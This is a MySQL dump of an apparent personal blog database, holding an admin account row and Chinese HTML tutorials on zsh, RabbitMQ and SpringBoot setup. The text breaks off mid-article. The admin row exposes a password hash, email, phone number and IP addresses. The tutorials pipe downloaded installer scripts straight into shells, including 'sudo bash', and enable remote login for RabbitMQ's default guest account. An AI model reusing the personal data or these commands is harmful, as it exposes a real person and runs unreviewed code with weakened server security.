-- MySQL dump 10.13  Distrib 8.0.28, for Win64 (x86_64)
--
-- Host: 119.29.35.129    Database: golden-years
-- ------------------------------------------------------
-- Server version	8.0.20

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!50503 SET NAMES utf8mb4 */;
/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
/*!40103 SET TIME_ZONE='+00:00' */;
/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;

--
-- Table structure for table `t_admin`
--

DROP TABLE IF EXISTS `t_admin`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_admin` (
  `id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `username` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `password` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `face_id` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `gender` char(1) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `avatar` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `status` int NOT NULL,
  `email` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `birthday` timestamp NULL DEFAULT NULL,
  `mobile` varchar(11) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `last_login_time` timestamp NULL DEFAULT NULL,
  `last_login_ip` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `create_time` timestamp NOT NULL,
  `update_time` timestamp NOT NULL,
  `role_id` varchar(32) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `last_login_location` varchar(12) DEFAULT NULL,
  PRIMARY KEY (`id`) USING BTREE,
  UNIQUE KEY `username` (`username`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_admin`
--

LOCK TABLES `t_admin` WRITE;
/*!40000 ALTER TABLE `t_admin` DISABLE KEYS */;
INSERT INTO `t_admin` VALUES ('2007108YW09A83XP54534535','admin','$2a$10$19PF8IxegFYrwlnZYXyOpe8DsDCFp8hx7/SqrmLrBVLMd9FGctA7y','62568a88e2d5a53f8326bd47','0','http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJIWdOAPTxvAAEL1uAv-OE27.blob',1,'17796706221@163.com','2022-02-28 08:00:00','17796706221','2022-05-20 11:38:02','106.12.136.221','2020-07-10 04:33:12','2022-05-07 06:04:28','434994947c5a4ee3a710cd277357c7c3','广东省广州市 BGP');
/*!40000 ALTER TABLE `t_admin` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `t_article`
--

DROP TABLE IF EXISTS `t_article`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `t_article` (
  `id` varchar(24) NOT NULL,
  `title` varchar(64) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `content` longtext CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `category_id` int NOT NULL,
  `article_type` int NOT NULL,
  `article_cover` varchar(256) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci DEFAULT NULL,
  `article_status` int NOT NULL,
  `is_appoint` int NOT NULL,
  `author_id` varchar(24) CHARACTER SET utf8mb4 COLLATE utf8mb4_0900_ai_ci NOT NULL,
  `summary` varchar(255) NOT NULL,
  `read_counts` int NOT NULL DEFAULT '0',
  `collect_counts` int NOT NULL,
  `comment_counts` int NOT NULL DEFAULT '0',
  `mongo_file_id` varchar(64) DEFAULT NULL,
  `is_delete` int NOT NULL DEFAULT '0',
  `influence` int NOT NULL,
  `create_time` datetime NOT NULL,
  `update_time` datetime NOT NULL,
  `tags` text NOT NULL,
  `star_counts` int DEFAULT '0',
  PRIMARY KEY (`id`) USING BTREE
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_0900_ai_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `t_article`
--

LOCK TABLES `t_article` WRITE;
/*!40000 ALTER TABLE `t_article` DISABLE KEYS */;
INSERT INTO `t_article` VALUES ('220403CPZ5ZB5BTC','安装zsh','<h1><a id=\"_0\"></a>目录</h1>\n<p>[TOC]</p>\n<h2><a id=\"zsh_4\"></a>安装zsh</h2>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 安装zsh</span>\nyum install zsh\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 设置默认shell为zsh</span>\nchsh -s $(<span class=\"hljs-built_in\">which</span> zsh)\n<span class=\"hljs-comment\"># 切换为bash</span>\nchsh -s /bin/bash\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 检查设置是否成功</span>\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$SHELL</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 检查是否安装了zsh(安装oh-my-zsh之前必须安装zsh)</span>\nzsh --version\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 安装oh-my-zsh(wget)</span>\nsh -c <span class=\"hljs-string\">&quot;<span class=\"hljs-subst\">$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>&quot;</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\">vim ~/.zshrc\n</code></div></pre>\n<h2><a id=\"_37\"></a>设置主题</h2>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 默认主题</span>\nZSH_THEME=<span class=\"hljs-string\">&quot;robbyrussel&quot;</span>\n<span class=\"hljs-comment\"># mira agnoster duellj(推荐的主题)</span>\n<span class=\"hljs-comment\"># 设置随机主题</span>\nZSH_THEME=<span class=\"hljs-string\">&quot;random&quot;</span>\n<span class=\"hljs-comment\"># oh-my-zsh默认自带的主题放置的位置</span>\nvim ~/.oh-my-zsh/themes\n</code></div></pre>\n<h2><a id=\"_49\"></a>安装插件</h2>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 安装语法高亮插件</span>\ngit <span class=\"hljs-built_in\">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-syntax-highlighting\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 安装自动补全插件</span>\ngit <span class=\"hljs-built_in\">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-autosuggestions\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 在~/.zshrc中配置插件</span>\nplugins=(git wd web-search <span class=\"hljs-built_in\">history</span> history-substring-search zsh-syntax-highlighting zsh-autosuggestions)\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 重新加载配置即可</span>\n<span class=\"hljs-built_in\">source</span> ~/.zshrc\n</code></div></pre>\n<p><img src=\"https://cdn.qingweico.cn/blog/image-20220302181616907.png\" alt=\"image-20220302181616907\" /></p>\n',5,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbgiABTTkAAD1adl-4Ns31.jpeg',2,0,'220226DP09K1F0SW','目录 [TOC] 安装zsh #安装zsh yuminstallzsh #设置默认shell为zsh chsh-s$(whichzsh) #切换为bash chsh-s/bin/bash #检查设置是否成功 echo$SHELL #检查是否安装了zsh(安装oh-my-zsh之前必须安装zsh) zsh--version #安装oh-my-zsh(wget) sh-c&quot;$(wgethtt',0,0,0,NULL,0,0,'2021-10-06 09:51:49','2022-04-03 09:51:49','[\"220329D4N9GNBDKP\",\"220329D4B48S3TR4\"]',0),('220403CR70T8SZXP','RabbitMQ','<h1><a id=\"RabbitMQ_0\"></a>RabbitMQ</h1>\n<p>centos7.x</p>\n<p><a href=\"https://www.rabbitmq.com/which-erlang.html\" target=\"_blank\">查看erlang语言与rabbitmq之间的版本关系</a></p>\n<p><a href=\"https://www.rabbitmq.com/install-rpm.html\" target=\"_blank\">Install: RPM-based Linux</a></p>\n<p><a href=\"https://packagecloud.io/rabbitmq/erlang/install#bash-rpm\" target=\"_blank\">install a recent Erlang version via yum</a>.</p>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 安装erlang前置脚本文件 通过yum</span>\ncurl -s https://packagecloud.io/install/repositories/rabbitmq/erlang/script.rpm.sh | sudo bash\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\">## 导入签名密钥</span>\n<span class=\"hljs-comment\"># 主RabbitMQ 签名密钥</span>\nrpm --import https://github.com/rabbitmq/signing-keys/releases/download/2.0/rabbitmq-release-signing-key.asc\n<span class=\"hljs-comment\"># 现代Erlang存储库</span>\nrpm --import https://packagecloud.io/rabbitmq/erlang/gpgkey\n<span class=\"hljs-comment\"># RabbitMQ 服务器存储库</span>\nrpm --import https://packagecloud.io/rabbitmq/rabbitmq-server/gpgkey\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 安装erlang</span>\nyum install erlang\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 安装rabbitmq-server的前置准备</span>\ncurl -s https://packagecloud.io/install/repositories/rabbitmq/rabbitmq-server/script.rpm.sh | sudo bash\n</code></div></pre>\n<p><a href=\"https://github.com/rabbitmq/rabbitmq-server/tags\" target=\"_blank\">rabbbitmq版本下载列表</a></p>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 下载rabbiitmq</span>\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 安装rabbitmq</span>\nrpm -ivh rabbitmq-server-3.8.5-1.el7.noarch.rpm\n<span class=\"hljs-comment\">## error: Failed dependencies: socat is needed by rabbitmq-server-3.8.5-1.el7.noarch</span>\n<span class=\"hljs-comment\">## yum -y install socat</span>\n</code></div></pre>\n<p>配置文件</p>\n<p><a href=\"https://github.com/rabbitmq/rabbitmq-server/blob/master/deps/rabbit/docs/rabbitmq.conf.example\" target=\"_blank\">rabbitmq.conf.example</a></p>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 将文件重命名rabbitmq.conf放入/etc/rabbitmq/目录下</span>\n<span class=\"hljs-comment\"># 修改文件内容 保存退出</span>\n<span class=\"hljs-comment\"># 代表运行 guest 默认用户可以在非本地环境登录</span>\n {loopback_users, [&lt;&lt;<span class=\"hljs-string\">&quot;guest&quot;</span>&gt;&gt;]}, -----&gt; {loopback_users, []}\n</code></div></pre>\n<p>启用rabbitmq的管理平台插件</p>\n<pre><div class=\"hljs\"><code class=\"lang-bash\">rabbitmq-plugins <span class=\"hljs-built_in\">enable</span> rabbitmq_management\n</code></div></pre>\n<pre><div class=\"hljs\"><code class=\"lang-bash\"><span class=\"hljs-comment\"># 开启rabbitmq server</span>\nservice rabbitmq-server start\n<span class=\"hljs-comment\"># 重启rabbitmq server</span>\nservice rabbitmq-server restart\n</code></div></pre>\n',5,1,'http://119.29.35.129:8888/upload/M00/00/01/dx0jgWJJbkWABh0oAAB-kXmQajY44.jpeg',2,0,'220226DP09K1F0SW','RabbitMQ centos7.x 查看erlang语言与rabbitmq之间的版本关系 Install:RPM-basedLinux installarecentErlangversionviayum. #安装erlang前置脚本文件通过yum curl-shttps://packagecloud.io/install/repositories/rabbitmq/erlang/script.r',0,0,0,NULL,0,323,'2022-02-05 10:55:35','2022-04-03 09:52:39','[\"220329D4N9GNBDKP\",\"220329D5TZ12F0DP\"]',0),('220403CRCRB6P0ZC','SpringBoot','<h1><a id=\"_0\"></a>目录</h1>\n<p>[TOC]</p>\n<h1><a id=\"SpringBootv232RELEASE_4\"></a>SpringBoot（v2.3.2.RELEASE）</h1>\n<h2><a id=\"SpringBoot_6\"></a>SpringBoot配置</h2>\n<h3><a id=\"_8\"></a>场景启动器</h3>\n<p>spring-boot-start</p>\n<pre><div class=\"hljs\"><code class=\"lang-xml\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">parent</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>spring-boot-starter-parent<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">version</span>&gt;</span>2.3.0.RELEASE<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">version</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">parent</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">dependency</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">groupId</span>&gt;</span>org.springframework.boot<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">groupId</span>&gt;</span>\n    <span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">artifactId</span>&gt;</span>spring-boot-starter-web<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">artifactId</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">dependency</span>&gt;</span>\n</code></div></pre>\n<h3><a id=\"SpringBootApplication_24\"></a>@SpringBootApplication注解</h3>\n<h4><a id=\"SpringBootConfiguration_26\"></a>@SpringBootConfiguration</h4>\n<ul>\n<li>@Configuration</li>\n</ul>\n<h4><a id=\"EnableAutoConfiguration_30\"></a>@EnableAutoConfiguration</h4>\n<ul>\n<li>\n<p>@AutoConfigurationPackage</p>\n<ul>\n<li>\n<p>@Import(AutoConfigurationPackages.Registrar.class)(Spring底层注解 给容器导入一个组件)</p>\n<p>将主配置类(@SpringBootApplication标注的类)所在的包及其下所有的子包里面所有的组件扫描到容器中,或者使用@SpringBootApplication(scanBasePackages = {“com.example”})指定扫描的包,也可以使用注解@ComponentScan(value = “com.example”)指定扫描的包</p>\n</li>\n</ul>\n</li>\n<li>\n<p>@Import({AutoConfigurationImportSelector.class})</p>\n<ul>\n<li>AutoConfigurationImportSelector 将需要导入的组件以全类名的方式返回并添加到容器中,即给容器中导入很多的自动配置类</li>\n</ul>\n</li>\n</ul>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-comment\">/*AutoConfigurationImportSelector.class*/</span>\n<span class=\"hljs-keyword\">protected</span> List&lt;String&gt; <span class=\"hljs-title function_\">getCandidateConfigurations</span><span class=\"hljs-params\">(AnnotationMetadata metadata, AnnotationAttributes attributes)</span> {\n    List&lt;String&gt; configurations = SpringFactoriesLoader.loadFactoryNames(<span class=\"hljs-built_in\">this</span>.getSpringFactoriesLoaderFactoryClass(), <span class=\"hljs-built_in\">this</span>.getBeanClassLoader());\n    Assert.notEmpty(configurations, <span class=\"hljs-string\">&quot;No auto configuration classes found in META-INF/spring.factories. If you are using a custom packaging, make sure that file is correct.&quot;</span>);\n    <span class=\"hljs-keyword\">return</span> configurations;\n}\n</code></div></pre>\n<p>SpringBoot在启动时从类路径下<font>spring-boot-autoconfigure-2.3.0.RELEASE.jar/META-INF/spring.factories</font>找到EnabledAutoConfiguration指定的值并将这些值作为配置类导入到容器中</p>\n<h3><a id=\"SpringBoot_53\"></a>SpringBoot全局配置文件</h3>\n<ul>\n<li>Application.properties</li>\n<li>Application.yml</li>\n</ul>\n<h4><a id=\"yml_58\"></a>yml文件</h4>\n<p>将空格玩到极致的语法  所有的冒号后面都有一个空格</p>\n<pre><div class=\"hljs\"><code class=\"lang-yaml\"><span class=\"hljs-attr\">person:</span>          <span class=\"hljs-comment\">#person对象的写法 行内写法 person: {name: jack,age: 21}</span>\n  <span class=\"hljs-attr\">name:</span> <span class=\"hljs-string\">jack</span>     <span class=\"hljs-comment\">#字符串默认不加引号 单引号表示转义特殊字符 双引号则不转义特殊字符</span>\n  <span class=\"hljs-attr\">age:</span> <span class=\"hljs-number\">21</span>\n  <span class=\"hljs-attr\">list:</span>          <span class=\"hljs-comment\">#数组类型 行内写法 list: [hello, world]</span>\n    <span class=\"hljs-bullet\">-</span> <span class=\"hljs-string\">hello</span>\n    <span class=\"hljs-bullet\">-</span> <span class=\"hljs-string\">world</span>\n  <span class=\"hljs-attr\">maps:</span>          <span class=\"hljs-comment\">#map集合类型 和对象类型一样 key: value 键和值</span>\n    <span class=\"hljs-attr\">k1:</span> <span class=\"hljs-string\">v1</span>\n    <span class=\"hljs-attr\">k2:</span> <span class=\"hljs-number\">12</span>\n</code></div></pre>\n<pre><code class=\"lang-properties\">#等价于properties文件\nperson.name=jack\nperson.age=21\nperson.list=hello,world\nperson.maps.k1=v1\nperson.maps.k2=12\n</code></pre>\n<h4><a id=\"yml_83\"></a>读取yml文件</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> com.example.entry;\n<span class=\"hljs-keyword\">import</span> org.springframework.boot.context.properties.ConfigurationProperties;\n<span class=\"hljs-keyword\">import</span> org.springframework.stereotype.Component;\n<span class=\"hljs-keyword\">import</span> java.util.Arrays;\n<span class=\"hljs-keyword\">import</span> java.util.Map; \n<span class=\"hljs-meta\">@Component</span>                   \n<span class=\"hljs-meta\">@ConfigurationProperties(prefix = &quot;person&quot;)</span> <span class=\"hljs-comment\">/*匹配yml文件中以person开头的配置文件*/</span>\n<span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">Person</span> {\n    <span class=\"hljs-keyword\">private</span> String name;\n    <span class=\"hljs-keyword\">private</span> Integer age;\n    <span class=\"hljs-keyword\">private</span> String[] list;\n    <span class=\"hljs-keyword\">private</span> Map&lt;String,Object&gt; maps;\n    <span class=\"hljs-keyword\">public</span> Map&lt;String, Object&gt; <span class=\"hljs-title function_\">getMaps</span><span class=\"hljs-params\">()</span> {\n        <span class=\"hljs-keyword\">return</span> maps;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">setMaps</span><span class=\"hljs-params\">(Map&lt;String, Object&gt; maps)</span> {\n        <span class=\"hljs-built_in\">this</span>.maps = maps;\n    }\n\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title function_\">getName</span><span class=\"hljs-params\">()</span> {\n        <span class=\"hljs-keyword\">return</span> name;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">setName</span><span class=\"hljs-params\">(String name)</span> {\n        <span class=\"hljs-built_in\">this</span>.name = name;\n    }\n\n    <span class=\"hljs-keyword\">public</span> Integer <span class=\"hljs-title function_\">getAge</span><span class=\"hljs-params\">()</span> {\n        <span class=\"hljs-keyword\">return</span> age;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">setAge</span><span class=\"hljs-params\">(Integer age)</span> {\n        <span class=\"hljs-built_in\">this</span>.age = age;\n    }\n\n    <span class=\"hljs-keyword\">public</span> String[] getList() {\n        <span class=\"hljs-keyword\">return</span> list;\n    }\n\n    <span class=\"hljs-keyword\">public</span> <span class=\"hljs-keyword\">void</span> <span class=\"hljs-title function_\">setList</span><span class=\"hljs-params\">(String[] list)</span> {\n        <span class=\"hljs-built_in\">this</span>.list = list;\n    }\n\n    <span class=\"hljs-meta\">@Override</span>\n    <span class=\"hljs-keyword\">public</span> String <span class=\"hljs-title function_\">toString</span><span class=\"hljs-params\">()</span> {\n        <span class=\"hljs-keyword\">return</span> <span class=\"hljs-string\">&quot;Person{&quot;</span> +\n                <span class=\"hljs-string\">&quot;name=&#x27;&quot;</span> + name + <span class=\"hljs-string\">&#x27;\\&#x27;&#x27;</span> +\n                <span class=\"hljs-string\">&quot;, age=&quot;</span> + age +\n                <span class=\"hljs-string\">&quot;, list=&quot;</span> + Arrays.toString(list) +\n                <span class=\"hljs-string\">&quot;, maps=&quot;</span> + maps +\n                <span class=\"hljs-string\">&#x27;}&#x27;</span>;\n    }\n}\n</code></div></pre>\n<h4><a id=\"ConfigurationPropertiesValue_142\"></a>@ConfigurationProperties和@Value的区别</h4>\n<p>@ConfigurationProperties默读取全局配置文件</p>\n<p>相同点都是可以从配置文件中读取值并注入到字段中(前提是字段所属的类一定要在ioc容器中)</p>\n<p>@ConfigurationProperties批量注入配置文件中的数据,而@Value则是一次一次注入</p>\n<p>前者支持松散绑定语法(下划线转驼峰),而后者不支持</p>\n<p>前者不支持SPEL,后者支持</p>\n<p>前者支持数据校验,后者不支持</p>\n<p>前者支持复杂数据类型的封装,后者不支持</p>\n<p>前者支持注入静态类型的变量,后者不支持(当使用set方法时也可以完成为静态变量注入,注意set方法不可以是静态的, 且@Value注解加在set方法上)</p>\n<h3><a id=\"PropertySouceImportResouce_160\"></a>PropertySouce和ImportResouce注解的区别</h3>\n<h4><a id=\"PropertySource_162\"></a>PropertySource</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@PropertySouce(value = {&quot;classpath:xxx.properties&quot;})</span> <span class=\"hljs-comment\">//加载指定的配置文件</span>\n</code></div></pre>\n<h4><a id=\"ImportResource_168\"></a>ImportResource（标注在一个配置类上）</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-meta\">@ImportResource(locations = {&quot;classpath:bean.xml&quot;})</span> <span class=\"hljs-comment\">//导入spring的配置文件(xxx.xml)   </span>\n</code></div></pre>\n<p>SpringBoot不能自动识别自定义的配置文件,需要手动导入</p>\n<p>SpringBoot不推荐用此方式向Spring容器中添加组件,可以自定义一个配置类代替配置文件,使用<code>@Bean</code>注解方式向容器中加入组件</p>\n<h3><a id=\"_178\"></a>配置文件占位符</h3>\n<pre><code class=\"lang-properties\">person.name=jack${person.hello:hello} #不存在的属性直接看成字符串 可以赋予默认值\nperson.age=${random.int}              #随机数\nperson.list=hello,world\nperson.maps.k1=v1\nperson.maps.k2=12_${person.name}      #配置文件存在的属性则替换\n</code></pre>\n<h3><a id=\"ProFile_188\"></a>多ProFile文件</h3>\n<h4><a id=\"properties_190\"></a>properties文件</h4>\n<p>在主配置文件中激活环境</p>\n<pre><code class=\"lang-properties\">spring.Profiles.active = dev\n</code></pre>\n<p>application-dev.properties</p>\n<pre><code class=\"lang-properties\">server.port = 8082\n</code></pre>\n<h4><a id=\"yml_204\"></a>yml文件</h4>\n<p>使用文档块的形式</p>\n<pre><div class=\"hljs\"><code class=\"lang-yml\"><span class=\"hljs-attr\">server:</span>\n  <span class=\"hljs-attr\">port:</span> <span class=\"hljs-number\">8080</span>\n<span class=\"hljs-attr\">spring:</span>\n  <span class=\"hljs-attr\">profiles:</span>\n    <span class=\"hljs-attr\">active:</span> <span class=\"hljs-string\">dev</span>  <span class=\"hljs-comment\"># 不写激活默认环境（8080）</span>\n<span class=\"hljs-string\">---</span>              <span class=\"hljs-comment\"># ---代表一个文档块</span>\n<span class=\"hljs-attr\">server:</span>\n  <span class=\"hljs-attr\">port:</span> <span class=\"hljs-number\">8081</span>\n<span class=\"hljs-attr\">spring:</span>\n  <span class=\"hljs-attr\">profiles:</span> <span class=\"hljs-string\">dev</span>  <span class=\"hljs-comment\"># 开发环境</span>\n<span class=\"hljs-meta\">---</span>\n<span class=\"hljs-attr\">server:</span>\n  <span class=\"hljs-attr\">port:</span> <span class=\"hljs-number\">8082</span>\n<span class=\"hljs-attr\">spring:</span>\n  <span class=\"hljs-attr\">profiles:</span> <span class=\"hljs-string\">prod</span> <span class=\"hljs-comment\"># 生产环境</span>\n</code></div></pre>\n<h4><a id=\"_226\"></a>使用命令行参数</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\">--spring.profiles.active=dev\n</code></div></pre>\n<h4><a id=\"_232\"></a>使用虚拟机参数</h4>\n<pre><div class=\"hljs\"><code class=\"lang-java\">-Dspring.profiles.active=dev\n</code></div></pre>\n<h3><a id=\"_238\"></a>配置文件的加载顺序</h3>\n<p>优先级为：项目根路径下的config中的配置文件 &gt; 项目根路径下配置文件 &gt; 类路径下config中的配置文件 &gt; 类路径下配置文件</p>\n<pre><code class=\"lang-properties\">/config/xxx.properties\n/xxx.properties\nclasspath:/config/xxx.properties\nclasspaht:/xxx.properties\n</code></pre>\n<p>SpringBoot会全部加载这四个位置的配置文件,高优先级的配置文件会覆盖优先级低的相同配置文件</p>\n<pre><code class=\"lang-properties\"># 等号之间不要加空格\n# 在项目打包时可以加载指定路径的配置文件\n--spring.config.location=xxx.properties\n</code></pre>\n<pre><code class=\"lang-properties\"># 等号之间不要加空格\njava -jar hello-0.0.1-SNAPSHOT.jar --spring.config.location=E:/application.properties\n</code></pre>\n<pre><div class=\"hljs\"><code class=\"lang-java\">server.servlet.context-path=/test\n</code></div></pre>\n<h3><a id=\"_266\"></a>外部配置加载顺序</h3>\n<ul>\n<li>命令行</li>\n</ul>\n<pre><code class=\"lang-properties\">#运行jar文件时指定端口号 运行路径,等号之间不要加空格 多个配置空额隔开\njava -jar hello-0.0.1-SNAPSHOT.jar --server.port=8848 --server.servlet.context-path=/test\n</code></pre>\n<ul>\n<li>优先加载带profile的文件,再加载不带profile的文件</li>\n<li>从jar包外向内加载</li>\n</ul>\n<h3><a id=\"SpringBoot_278\"></a>SpringBoot访问静态资源</h3>\n<pre><code class=\"lang-properties\">classpath:/META-INF/resources/\nclasspath:/resources/\nclasspath:/public/\nclasspath:/static/\n/:\n</code></pre>\n<pre><div class=\"hljs\"><code class=\"lang-yaml\"><span class=\"hljs-attr\">spring:</span>\n  <span class=\"hljs-attr\">mvc:</span>\n  <span class=\"hljs-comment\"># 配置文件 自定义静态资源的f</span>\n    <span class=\"hljs-attr\">static-path-pattern:</span> <span class=\"hljs-string\">/static/**</span>\n  <span class=\"hljs-attr\">resources:</span>\n  <span class=\"hljs-comment\"># 配置文件 自定义静态资源的路径</span>\n    <span class=\"hljs-attr\">static-locations:</span> <span class=\"hljs-string\">classpath:/hello,classpath:/test</span>\n</code></div></pre>\n<h4><a id=\"Spring_BootrequestgetServletContextgetRealPath_298\"></a>关于Spring Boot中使用request.getServletContext().getRealPath路径获取问题</h4>\n<p><code>String path = req.getServletContext().getRealPath(&quot;&quot;);</code></p>\n<p>默认情况下返回的是一个临时文件夹的地址</p>\n<pre><div class=\"hljs\"><code class=\"lang-java\"><span class=\"hljs-keyword\">package</span> org.springframework.boot.web.servlet.server;	\n<span class=\"hljs-keyword\">class</span> <span class=\"hljs-title class_\">DocumentRoot</span>{\n    <span class=\"hljs-keyword\">private</span> <span class=\"hljs-keyword\">static</span> <span class=\"hljs-keyword\">final</span> String[] COMMON_DOC_ROOTS = { <span class=\"hljs-string\">&quot;src/main/webapp&quot;</span>, <span class=\"hljs-string\">&quot;public&quot;</span>, <span class=\"hljs-string\">&quot;static&quot;</span> };\n}\n</code></div></pre>\n<p>所以只要在项目根目录新建文件夹public或者static或者在类路径下新建文件夹webapp即可读到路径</p>\n<p>优先级 webapp &gt; public &gt; static(同时存在)</p>\n<h3><a id=\"Thymeleaf_315\"></a>Thymeleaf</h3>\n<pre><div class=\"hljs\"><code class=\"lang-html\"><span class=\"hljs-comment\">&lt;!--引入名称空间--&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">lang</span>=<span class=\"hljs-string\">&quot;en&quot;</span> <span class=\"hljs-attr\">xmlns:th</span>=<span class=\"hljs-string\">&quot;http://www.thymeleaf.org&quot;</span>&gt;</span>\n</code></div></pre>\n<h4><a id=\"_322\"></a>抽取公共代码片段</h4>\n<pre><div class=\"hljs\"><code class=\"lang-html\"><span class=\"hljs-comment\">&lt;!--footer模板--&gt;</span>\n<span class=\"hljs-meta\">&lt;!DOCTYPE <span class=\"hljs-keyword\">html</span>&gt;</span>\n<span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">html</span> <span class=\"hljs-attr\">xmlns:th</span>=<span 